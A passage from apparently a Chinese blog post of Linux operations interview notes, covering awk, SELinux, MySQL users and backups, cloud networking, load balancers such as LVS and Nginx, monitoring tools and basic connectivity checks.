$1,$2&#125;&#x27;</span>   log.txt</span><br><span class=\"line\"><span class=\"comment\"># 或者使用内建变量</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;BEGIN&#123;FS=&quot;,&quot;&#125; &#123;print $1,$2&#125;&#x27;</span>     log.txt</span><br><span class=\"line\"><span class=\"comment\"># 使用多个分隔符.先使用空格分割，然后对分割结果再使用&quot;,&quot;分割</span></span><br><span class=\"line\"> $ awk -F <span class=\"string\">&#x27;[ ,]&#x27;</span>  <span class=\"string\">&#x27;&#123;print $1,$2,$5&#125;&#x27;</span>   log.txt</span><br><span class=\"line\"><span class=\"comment\"># 设置变量a=1</span></span><br><span class=\"line\"> $ awk -va=1 <span class=\"string\">&#x27;&#123;print $1,$1+a&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># awk -f &#123;awk脚本&#125; &#123;文件名&#125;</span></span><br><span class=\"line\"> $ awk -f cal.awk log.txt</span><br><span class=\"line\"><span class=\"comment\"># 过滤第一列大于2的行</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;$1&gt;2&#x27;</span> log.txt    </span><br><span class=\"line\"><span class=\"comment\"># 过滤第一列大于2并且第二列等于&#x27;Are&#x27;的行</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&#x27;</span> log.txt    </span><br><span class=\"line\"><span class=\"comment\"># 输出顺序号 NR, 匹配文本行号</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;&#123;print NR,FNR,$1,$2,$3&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 指定输出分割符</span></span><br><span class=\"line\"> $  awk <span class=\"string\">&#x27;&#123;print $1,$2,$5&#125;&#x27;</span> OFS=<span class=\"string\">&quot; $ &quot;</span>  log.txt</span><br><span class=\"line\"><span class=\"comment\"># 输出第二列包含 &quot;th&quot;，并打印第二列与第四列(~ 表示模式开始// 中是模式)</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;$2 ~ /th/ &#123;print $2,$4&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 忽略大小写</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;BEGIN&#123;IGNORECASE=1&#125; /this/&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># BEGIN&#123; 这里面放的是执行前的语句 &#125;</span></span><br><span class=\"line\"><span class=\"comment\"># END &#123;这里面放的是处理完所有的行后要执行的语句 &#125;</span></span><br><span class=\"line\"><span class=\"comment\"># &#123;这里面放的是处理每一行时要执行的语句&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># 计算文件大小</span></span><br><span class=\"line\"> $ <span class=\"built_in\">ls</span> -l *.txt | awk <span class=\"string\">&#x27;&#123;sum+=$5&#125; END &#123;print sum&#125;&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> grep 更适合单纯的查找或匹配文本</span><br><span class=\"line\"> sed 更适合编辑匹配到的文本</span><br><span class=\"line\"> awk 更适合格式化文本，对文本进行较复杂格式处理</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\"> FS(Field Separator)：输入字段分隔符， 默认为空白字符</span><br><span class=\"line\"> OFS(Out of Field Separator)：输出字段分隔符， 默认为空白字符</span><br><span class=\"line\"> RS(Record Separator)：输入记录分隔符(输入换行符)， 指定输入时的换行符</span><br><span class=\"line\"> ORS(Output Record Separate)：输出记录分隔符（输出换行符），输出时用指定符号代替换行符</span><br><span class=\"line\"> NF(Number <span class=\"keyword\">for</span> Field)：当前行的字段的个数(即当前行被分割成了几列)</span><br><span class=\"line\"> NR(Number of Record)：行号，当前处理的文本行的行号。</span><br><span class=\"line\"> FNR：各文件分别计数的行号</span><br><span class=\"line\"> ARGC：命令行参数的个数</span><br><span class=\"line\"> ARGV：数组，保存的是命令行所给定的各参数</span><br></pre></td></tr></table></figure>\n<h4 id=\"selinux\"><a class=\"markdownIt-Anchor\" href=\"#selinux\">#</a> selinux</h4>\n<blockquote>\n<p>Linux 下默认的接入控制是 DAC，其特点是资源的拥有者可以对他进行任何操作（读、写、执行）。当一个进程准备操作资源时，Linux 内核会比较进程和资源的 UID 和 GID，如果权限允许，就可以进行相应的操作。</p>\n<p>SELinux 属于 MAC 的具体实现，增强了 Linux 系统的安全性。MAC 机制的特点在于，资源的拥有者，并不能决定谁可以接入到资源。具体决定是否可以接入到资源，是基于安全策略。而安全策略则是有一系列的接入规则组成，并仅有特定权限的用户有权限操作安全策略。</p>\n<p>Security Enhanced Linux (SELinux) 为 Linux 提供了一种增强的安全机制，其本质就是回答了一个 “Subject 是否可以对 Object 做 Action?” 的问题，例如 Web 服务可以写入到用户目录下面的文件吗？其中 Web 服务就是 Subject 而文件就是 Object，写入对应的就是 Action。</p>\n<ul>\n<li>Subject: 在 SELinux 里指的就是进程，也就是操作的主体。</li>\n<li>Object： 操作的目标对象，例如 文件</li>\n<li>Action： 对 Object 做的动作，例如 读取、写入或者执行等等</li>\n<li>Context： Subject 和 Object 都有属于自己的 Context，也可以称作为 Label。Context 有几个部分组成，分别是 SELinux User、SELinux Role、SELinux Type、SELinux Level</li>\n</ul>\n<p>进程和文件都有属于自己的 Context 信息，Context 分为几个部分，分别是 SELinux User、Role、Type 和一个可选的 Level 信息。SELinux 在运行过程中将使用这些信息查询安全策略进行决策。</p>\n<p>显示进程的 Context ps -z</p>\n<p>显示文件的 Context 信息 ls -z</p>\n<p>临时修改文件的 SELinux Type 为 <code>htttpd_sys_content_t</code>   \t <code>chcon -t httpd_sys_content_t file-name</code></p>\n<p>SELinux 有三个运行状态，分别是 disabled, permissive 和 enforcing</p>\n<ul>\n<li>Disable： 禁用 SELinux，不会给任何新资源打 Label，如果重新启用的话，将会给资源重新打上 Lable，过程会比较缓慢。</li>\n<li>Permissive：如果违反安全策略，并不会真正的执行拒绝操作，替代的方式是记录一条 log 信息。</li>\n<li>Enforcing: 默认模式，SELinux 的正常状态，会实际禁用违反策略的操作</li>\n</ul>\n<p>SELinux 的 Log 日志默认记录在 <code>/var/log/audit/audit.log</code></p>\n<p>SELinux 的配置文件位于 <code>/etc/selinux/config</code></p>\n<p>Booleans 允许在运行时修改 SELinux 安全策略。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84NjgxMzcwOQ==\">理解 Linux 下的 SELinux - 知乎 (zhihu.com)</span></p>\n</blockquote>\n<h3 id=\"10mysql相关\"><a class=\"markdownIt-Anchor\" href=\"#10mysql相关\">#</a> 10.mysql 相关</h3>\n<h4 id=\"mysql新建用户茄子\"><a class=\"markdownIt-Anchor\" href=\"#mysql新建用户茄子\">#</a> mysql 新建用户 (茄子)</h4>\n<blockquote>\n<ol>\n<li></li>\n</ol>\n<p>CREATE USER user_account IDENTIFIED BY password;  #CREATE USER dbadmin@localhost  IDENTIFIED BY ‘pwd123’;</p>\n<p>CREATE USER superadmin@’%’ IDENTIFIED BY ‘mypassword’; # 要允许用户帐户从任何主机连接，请使用百分比 ( <code>%</code> ) 通配符</p>\n<p>CREATE USER remote_user; #可以从任何主机连接到数据库服务器：</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>可以使用 INSERT 语句将用户的信息添加到 mysql.user 表中，但必须拥有对 mysql.user 表的 INSERT 权限。通常 INSERT 语句只添加 Host、User 和 authentication_string 这 3 个字段的值。</p>\n<p>INSERT INTO mysql.user(Host, User,  authentication_string, ssl_cipher, x509_issuer, x509_subject) VALUES (‘hostname’, ‘username’, PASSWORD(‘password’), ‘’, ‘’, ‘’);</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>GRANT SELECT ON*.* TO ‘test3’@localhost IDENTIFIED BY ‘test3’;</p>\n<p>4. 删除用户</p>\n<p>DROP USER ‘username’@‘host’;</p>\n<p>5. 更改密码</p>\n<p>SET PASSWORD FOR ‘username’@‘host’ = PASSWORD(‘newpassword’);</p>\n</blockquote>\n<h4 id=\"mysql查看权限茄子\"><a class=\"markdownIt-Anchor\" href=\"#mysql查看权限茄子\">#</a> mysql 查看权限 (茄子)</h4>\n<blockquote>\n<p>SHOW GRANTS FOR dbadmin@localhost;</p>\n<p>GRANT privileges ON databasename.tablename TO ‘username’@‘host’</p>\n<p>REVOKE privilege ON databasename.tablename FROM ‘username’@‘host’;</p>\n</blockquote>\n<h4 id=\"mysql备份中海达\"><a class=\"markdownIt-Anchor\" href=\"#mysql备份中海达\">#</a> mysql 备份 (中海达)</h4>\n<blockquote>\n<p>mysqldump -h 主机名 -P 端口 -u 用户名 -p 密码 –database 数据库名 &gt; 文件名.sql</p>\n<p>mysqldump –all-databases &gt; allbackupfile.sql     // 备份所有数据库</p>\n<p>直接将 MySQL 数据库压缩备份</p>\n<p>mysqldump -hhostname -uusername -ppassword -database databasename | gzip &gt; backupfile.sql.gz</p>\n<p>备份 MySQL 数据库某个 (些) 表</p>\n<p>mysqldump -hhostname -uusername -ppassword databasename specific_table1 specific_table2 &gt; backupfile.sql</p>\n<p>免费的 MySQl 热备份软件 Percona XtraBackup</p>\n<p>恢复数据库</p>\n<p>source /opt/all.sql;</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F5ZjE1ODIzNi9hcnRpY2xlL2RldGFpbHMvMTA5MjIwNTYz\">学习 MySQL 备份一篇就够了！！！（完全备份、增量备份、备份恢复）_下一个艺术家的博客 - CSDN 博客_mysql 备份文件</span></p>\n<h4 id=\"mysql可靠中海达\"><a class=\"markdownIt-Anchor\" href=\"#mysql可靠中海达\">#</a> mysql 可靠 (中海达)</h4>\n<blockquote>\n<p>… 这个问题超标了，自己看吧</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNTk2MDIwOA==\">五大常见的 MySQL 高可用方案 - 知乎 (zhihu.com)</span></p>\n</blockquote>\n<h4 id=\"acid汉得\"><a class=\"markdownIt-Anchor\" href=\"#acid汉得\">#</a> acid (汉得)</h4>\n<blockquote>\n<p>数据库管理系统在写入或更新资料的过程中，为保证事务（transaction）是正确可靠的，所必须具备的四个特性</p>\n<ul>\n<li>Atomicity（原子性）：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被恢复（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。</li>\n<li>Consistency（一致性）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。</li>\n<li>Isolation（隔离性）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。</li>\n<li>Durability（持久性）：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。</li>\n</ul>\n</blockquote>\n<h4 id=\"mysql锁汉得\"><a class=\"markdownIt-Anchor\" href=\"#mysql锁汉得\">#</a> mysql 锁 (汉得)</h4>\n<blockquote>\n<p>先挖个坑</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yOTE1MDgwOQ==\">MySQL 锁总结 - 知乎 (zhihu.com)</span></p>\n</blockquote>\n<h4 id=\"隔离级别汉得\"><a class=\"markdownIt-Anchor\" href=\"#隔离级别汉得\">#</a> 隔离级别 (汉得)</h4>\n<blockquote>\n<p>再挖个坑</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYWxpeXVuLmNvbS9hcnRpY2xlLzc0MzY5MQ==\">彻底搞懂 MySQL 事务的隔离级别 - 阿里云开发者社区 (aliyun.com)</span></p>\n</blockquote>\n<h4 id=\"主键外键区别主键索引区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#主键外键区别主键索引区别汉得\">#</a> 主键，外键区别，主键，索引区别 (汉得)</h4>\n<blockquote>\n<p>1、主键用来保证数据完整性，外键用来和其他表建立联系用；</p>\n<p>2、主键只能有一个，而一个表可以有多个外键；</p>\n<p>3、主键不能有重复，不允许为空，而外键可以有重复，可以是空值。</p>\n<p>主键、外键和索引的区别：</p>\n<p>a. 定义</p>\n<p>主键：唯一标识一条记录，不能有重复，不允许为空。<br>\n外键：表的外键是另一表的主键，外键是可以有重复的，可以是空值。<br>\n索引：该字段没有重复值，但可以有一个空值。</p>\n<p>b. 作用</p>\n<p>主键：用来保证数据完整性<br>\n外键：用来和其他表建立联系用<br>\n索引：用来提高查询排序的速度</p>\n<p>c. 个数</p>\n<p>主键：主键只能有一个。<br>\n外键：一个表可以有多个外键。<br>\n索引：一个表可以有多个唯一索引。</p>\n<p><strong>提高了查询效率</strong>，<strong>缺点是在插入、更新和删除记录时，需要同时修改索引</strong>，<strong>因此，索引越多，插入、更新和删除记录的速度就越慢。</strong></p>\n<p>通过 <code>UNIQUE</code>  关键字我们就添加了一个唯一索引</p>\n</blockquote>\n<h3 id=\"10云计算相关问题\"><a class=\"markdownIt-Anchor\" href=\"#10云计算相关问题\">#</a> 10. 云计算相关问题</h3>\n<h4 id=\"使用过公有云吗对公有云了解吗中科还问了openstack了解吗中海达茄子中科曙光\"><a class=\"markdownIt-Anchor\" href=\"#使用过公有云吗对公有云了解吗中科还问了openstack了解吗中海达茄子中科曙光\">#</a> 使用过公有云吗，对公有云了解吗，中科还问了 OpenStack 了解吗 (中海达，茄子，中科曙光)</h4>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNTU5ODQzNw==\">OpenStack 入门科普，看这一篇就够啦！ - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzE0NTU3NjczLzI0NzM4OTU=\">OpenStack 入门 —— 理论篇（一）：OpenStack 的概念、概览以及核心组件概述_51CTO 博客_openstack 的技术核心</span></p>\n<p>表示层：负责与用户交互，主要包含一些图形化界面的 web 门户网站（用于提供给非开发人员进行界面操作），同时该部分还提供了供开发人员进行二次开发的 API 接口。该部分还包括一些更高级的特性，例如：负载均衡、控制台代理安全和命名服务。</p>\n<p>逻辑层：提供云服务的智能控制功能，如：orchestration（负责任务的工作流管理）、scheduling（任务到资源的调度管理）、policy（配额等服务）、image registry（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbmZvLnN1cHBvcnQuaHVhd2VpLmNvbS9pbmZvLWZpbmRlci9lbmN5Y2xvcGVkaWEvemgvJUU5JTk1JTlDJUU1JTgzJThGLmh0bWw=\">镜像</span>实例的元数据管理）和 logging（事件计费管理)。</p>\n<p>资源层：包含计算、网络和存储等物理资源。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbmZvLnN1cHBvcnQuaHVhd2VpLmNvbS9pbmZvLWZpbmRlci9lbmN5Y2xvcGVkaWEvemgvJUU1JTg1JUFDJUU2JTlDJTg5JUU0JUJBJTkxLmh0bWw=\">什么是公有云？和私有云什么区别？ - 华为 (huawei.com)</span></p>\n</blockquote>\n<h4 id=\"iaaspaassaas吉利英伦\"><a class=\"markdownIt-Anchor\" href=\"#iaaspaassaas吉利英伦\">#</a> IAAS，PAAS，SAAS (吉利英伦)</h4>\n<blockquote>\n<p>Infrastructure-as-a-service<br>\nPlatform-as-a-service<br>\nSoftware-as-a-service</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029101351518.png\" alt=\"image-20221029101351518\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029101444881.png\" alt=\"image-20221029101444881\" style=\"zoom:67%;\" />\n</blockquote>\n<h4 id=\"vpc之间网络隔离云智\"><a class=\"markdownIt-Anchor\" href=\"#vpc之间网络隔离云智\">#</a> VPC 之间网络隔离（云智）</h4>\n<blockquote>\n<p>安全组是一个逻辑上的分组，由一个区域内具有相同安全需求的 ECS 组成。安全组和 ECS 绑定，可以实现如防火墙一样的功能，不同安全组的实例默认不相通，但可以授权两个安全组之间互访。</p>\n<p>网络 ACL 与安全组类似，也是安全防护策略，若想增加额外的安全防护层时，就可以启用网络 ACL。网络 ACL 是对子网的一个保护，通过与子网关联的出方向、入方向规则控制出入子网的数据流。安全组只有 “允许” 策略，但网络 ACL 可以 “拒绝” 和 “允许”。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM3ODk3My9hcnRpY2xlL2RldGFpbHMvMTEyNTE3MDk2\">vpc 网络隔离_云计算中 VPC 的由来及浅析_爱吃生菜的鱼的博客 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8yOTczNTgwNy9hcnRpY2xlL2RldGFpbHMvMTEyNTE3MTAw\">(66 条消息) vpc 网络隔离_一文秒懂云中安全 VPC_英俊潇洒你冲哥的博客 - CSDN 博客</span></p>\n</blockquote>\n<h3 id=\"11负载均衡相关\"><a class=\"markdownIt-Anchor\" href=\"#11负载均衡相关\">#</a> 11. 负载均衡相关</h3>\n<h4 id=\"有哪些负载均衡器茄子\"><a class=\"markdownIt-Anchor\" href=\"#有哪些负载均衡器茄子\">#</a> 有哪些负载均衡器 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LVS、Nginx、Haproxy</span><br><span class=\"line\">LVS:</span><br><span class=\"line\">1). 基于4层网络协议，几乎无流量产生，这个特点也决定这几个负载均衡软件里负载能力最强，内存、CPU占用资源也低。</span><br><span class=\"line\">2). 应用范围广，不仅对Web服务做负载均衡，而且可结合其他应用做负载，如LVS+MySQL负载均衡。</span><br><span class=\"line\">3). 配置简单， 可配置东西较少。</span><br><span class=\"line\">4). 无流量，LVS只分发请求，而流量并不从它本身出去，这点保证了均衡器IO的性能不会收到大流量的影响。</span><br><span class=\"line\">5). 有个虚IP概念。</span><br><span class=\"line\">Nginx:</span><br><span class=\"line\">1). 基于7层网络协议，对Http应用做分流策略，如配置域名。</span><br><span class=\"line\">2). 高负载、稳定。支持上万高并发。负载能力小于LVS。</span><br><span class=\"line\">3). 安装配置简单，支持的正则比Haproxy丰富。且对网络稳定性的依赖非常小。</span><br><span class=\"line\">4). 可通过端口检测到服务器内部的故障，如根据服务器处理网页返回的状态码、超时等，把返回错误的请求重新提交到另一个节点。</span><br><span class=\"line\">5). 作Web服务器。</span><br><span class=\"line\">6). 反向代理\\负载均衡。</span><br><span class=\"line\">Haproxy:</span><br><span class=\"line\">1). 支持虚拟主机，可工作在4层、7层。</span><br><span class=\"line\">2). 负载均衡效率上来讲Haproxy比Nginx更出色，在并发处理上也是优于Nginx。</span><br><span class=\"line\">3). 能够补充Nginx的一些缺点，如支持Session的保持，Cookie的引导。同时支持通过获取指定的url来检测后端服务器的状态。</span><br><span class=\"line\">4). 支持负载均衡策略较多。如roundrobin简单轮询、leastconn最少服务器连接数、static-rr权重轮询、uri哈希、sourceIP哈希、url_param请求的URL参数等。</span><br><span class=\"line\"></span><br><span class=\"line\">https://www.yisu.com/zixun/14680.html</span><br></pre></td></tr></table></figure>\n<h4 id=\"lvs云智\"><a class=\"markdownIt-Anchor\" href=\"#lvs云智\">#</a> LVS（云智）</h4>\n<blockquote>\n<p>LVS（Linux Virtual Server）即 Linux 虚拟服务器，是开源负载均衡项目，目前 LVS 已经被集成到 Linux 内核模块中。该项目在 Linux 内核中实现了基于 IP 的数据请求负载均衡调度方案，其体系结构如图 1 所示，终端互联网用户从外部访问公司的外部负载均衡服务器，终端用户的 Web 请求会发送给 LVS 调度器，调度器根据自己预设的算法决定将该请求发送给后端的某台 Web 服务器，比如，轮询算法可以将外部的请求平均分发给后端的所有服务器，终端用户访问 LVS 调度器虽然会被转发到后端真实的服务器，但如果真实服务器连接的是相同的存储，提供的服务也是相同的服务，最终用户不管是访问哪台真实服务器，得到的服务内容都是一样的，整个集群对用户而言都是透明的。最后根据 LVS 工作模式的不同，真实服务器会选择不同的方式将用户需要的数据发送到终端用户，<strong>LVS 工作模式分为 NAT 模式、TUN 模式、以及 DR 模式。</strong><br>\n1、基于 NAT 的 LVS 模式负载均衡</p>\n<p>在 LVS（NAT）模式的集群环境中，由于所有的数据请求及响应的数据包都需要经过 LVS 调度器转发，如果后端服务器的数量大于 10 台，则调度器就会成为整个集群环境的瓶颈。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031102931633.png\" alt=\"image-20221031102931633\"></p>\n<p>2. 基于 TUN 的 LVS 负载均衡</p>\n<p>LVS（TUN）的思路就是将请求与响应数据分离，让调度器仅处理数据请求，而让真实服务器响应数据包直接返回给客户端。</p>\n<p>LVS（TUN）模式要求真实服务器可以直接与外部网络连接，真实服务器在收到请求数据包后直接给客户端主机响应数据。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031102950493.png\" alt=\"image-20221031102950493\"></p>\n<p>3、基于 DR 的 LVS 负载均衡</p>\n<p>直接路由模式（DR 模式）要求调度器与后端服务器必须在同一个局域网内，VIP 地址需要在调度器与后端所有的服务器间共享，因为最终的真实服务器给客户端回应数据包时需要设置源 IP 为 VIP 地址，目标 IP 为客户端 IP，这样客户端访问的是调度器的 VIP 地址，回应的源地址也依然是该 VIP 地址（真实服务器上的 VIP），客户端是感觉不到后端服务器存在的。</p>\n<p>调度器根据算法在选出真实服务器后，在不修改数据报文的情况下，将数据帧的 MAC 地址修改为选出的真实服务器的 MAC 地址，通过交换机将该数据帧发给真实服务器。整个过程中，真实服务器的 VIP 不需要对外界可见。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031102959587.png\" alt=\"image-20221031102959587\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDQ3MDMwMy9hcnRpY2xlL2RldGFpbHMvODA1NDE2Mzk=\">LVS 负载均衡（LVS 简介、三种工作模式、十种调度算法）_chenhuyang 的博客 - CSDN 博客_lvs 负载均衡</span></p>\n</blockquote>\n<h3 id=\"12有哪些监控软件中海达茄子\"><a class=\"markdownIt-Anchor\" href=\"#12有哪些监控软件中海达茄子\">#</a> 12. 有哪些监控软件 (中海达，茄子)</h3>\n<blockquote>\n<p>Prometheus（普罗米修斯）</p>\n<p>Zabbix</p>\n<p>Cacti</p>\n<p>Nagios</p>\n<p>Grafana</p>\n<p>Open-falcon</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Q4MTE2MTg5NTIwL2FydGljbGUvZGV0YWlscy84MTczNzY5NA==\">https://blog.csdn.net/t8116189520/article/details/81737694</span></p>\n</blockquote>\n<h3 id=\"13中间件相关\"><a class=\"markdownIt-Anchor\" href=\"#13中间件相关\">#</a> 13. 中间件相关</h3>\n<h4 id=\"nginx了解吗nginx特性正向代理和反向代理负载均衡模式中海达长亭品高\"><a class=\"markdownIt-Anchor\" href=\"#nginx了解吗nginx特性正向代理和反向代理负载均衡模式中海达长亭品高\">#</a> Nginx 了解吗，Nginx 特性，正向代理和反向代理，负载均衡模式 (中海达，长亭，品高)</h4>\n<blockquote>\n<p>1. 正向代理和反向代理<br>\n正向代理： 一般的访问流程是客户端直接向目标服务器发送请求并获取内容，使用正向代理后，客户端改为向代理服务器发送请求，并指定目标服务器（原始服务器），然后由代理服务器和原始服务器通信，转交请求并获得的内容，再返回给客户端。正向代理隐藏了真实的客户端，为客户端收发请求，使真实客户端对服务器不可见；</p>\n<p>比如你访问 Google 时用的代理服务器就是正向代理</p>\n<p>反向代理： 与一般访问流程相比，使用反向代理后，直接收到请求的服务器是代理服务器，然后将请求转发给内部网络上真正进行处理的服务器，得到的结果返回给客户端。反向代理隐藏了真实的服务器，为服务器收发请求，使真实服务器对客户端不可见。一般在处理跨域请求的时候比较常用。现在基本上所有的大型网站都设置了反向代理。Nginx 可以根据不同的正则匹配，采取不同的转发策略，比如图片文件结尾的走文件服务器，动态页面走 web 服务器。并且 Nginx 对返回结果进行错误页跳转，异常判断等。如果被分发的服务器存在异常，他可以将请求重新转发给另外一台服务器，然后自动去除异常服务器。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101094821621.png\" alt=\"image-20221101094821621\" style=\"zoom:67%;\" />\n<p>2. 负载均衡</p>\n<p>单个服务器解决不了的问题，可以使用多个服务器，然后将请求分发到各个服务器上，将负载分发到不同的服务器，这就是负载均衡，核心是「分摊压力」。Nginx 实现负载均衡，一般来说指的是将请求转发给服务器集群。</p>\n<p>Nginx 提供的负载均衡策略有 2 种：内置策略和扩展策略。内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的啦，你可以参照所有的负载均衡算法，给他一一找出来做下实现。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101095012272.png\" alt=\"image-20221101095012272\" style=\"zoom:67%;\" />\n<p>3. 动静分离</p>\n<p>为了加快网站的解析速度，可以把动态页面和静态页面由不同的服务器来解析，加快解析速度，降低原来单个服务器的压力。</p>\n<p>由于 Nginx 的高并发和静态资源缓存等特性，经常将静态资源部署在 Nginx 上。如果请求的是静态资源，直接到静态资源目录获取资源，如果是动态资源的请求，则利用反向代理的原理，把请求转发给对应后台应用去处理，从而实现动静分离。</p>\n<p>使用前后端分离后，可以很大程度提升静态资源的访问速度，即使动态服务不可用，静态资源的访问也不会受到影响。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101095048519.png\" alt=\"image-20221101095048519\" style=\"zoom:67%;\" />\n<p>4.web 缓存</p>\n<p>Nginx 可以对不同的文件做不同的缓存处理，配置灵活，并且支持 FastCGI_Cache，主要用于对 FastCGI 的动态程序进行缓存。配合着第三方的 ngx_cache_purge，对制定的 URL 缓存内容可以的进行增删管理。</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmdpbngub3JnLmNuL2FydGljbGUvZGV0YWlsLzU0NQ==\">Nginx 从入门到实践，万字详解！ - NGINX 开源社区</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS93M2Nub3RlL25naW54LXNldHVwLWludHJvLmh0bWw=\">Nginx 配置详解 | 菜鸟教程 (runoob.com)</span></p>\n<h3 id=\"14连通性toubleshooting问题\"><a class=\"markdownIt-Anchor\" href=\"#14连通性toubleshooting问题\">#</a> 14. 连通性 /toubleshooting 问题</h3>\n<h4 id=\"141判断和主机建立了连接的ip茄子\"><a class=\"markdownIt-Anchor\" href=\"#141判断和主机建立了连接的ip茄子\">#</a> 14.1 判断和主机建立了连接的 IP (茄子)</h4>\n<blockquote>\n<p>netstat -ano</p>\n<p>netstat -lntup</p>\n<p>nbtstat -A 10.129.52.207</p>\n<p>NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [interval] ]</p>\n<pre><code>        -a (适配器状态) 列出指定名称的远程机器的名称表\n    \n        -A (适配器状态) 列出指定 IP 地址的远程机器的名称表。\n    \n        -c (缓存) 列出远程[计算机]名称及其 IP 地址的 NBT 缓存\n    \n        -n (名称) 列出本地 NetBIOS 名称。\n    \n        -r (已解析) 列出通过广播和经由 WINS 解析的名称\n    \n        -R (重新加载) 清除和重新加载远程缓存名称表\n    \n        -S (会话) 列出具有目标 IP 地址的会话表\n    \n        -s (会话) 列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。\n    \n        -RR (释放刷新) 将名称释放包发送到 WINS，然后启动刷新\n</code></pre>\n</blockquote>\n<h4 id=\"142主机间是否连通端口是否开放茄子\"><a class=\"markdownIt-Anchor\" href=\"#142主机间是否连通端口是否开放茄子\">#</a> 14.2 主机间是否连通，端口是否开放 (茄子)</h4>\n<blockquote>\n<p>连通：</p>\n<p>ping</p>\n<p>traceroute</p>\n<p>端口：</p>\n<p>telnet 192.192.193.211 3389</p>\n<p>nc -z 192.192.193.211 22    //tcp</p>\n<p>nc –uz 192.192.193.211 22    //udp</p>\n<p>nmap   // 看我写的安全那块</p>\n<p>netstat -ano</p>\n<p>ssh 10.0.250.3 -p 80 -v</p>\n<p>wget …:</p>\n</blockquote>\n<h3 id=\"15怎么保证安全和可靠信锐\"><a class=\"markdownIt-Anchor\" href=\"#15怎么保证安全和可靠信锐\">#</a> 15. 怎么保证安全和可靠 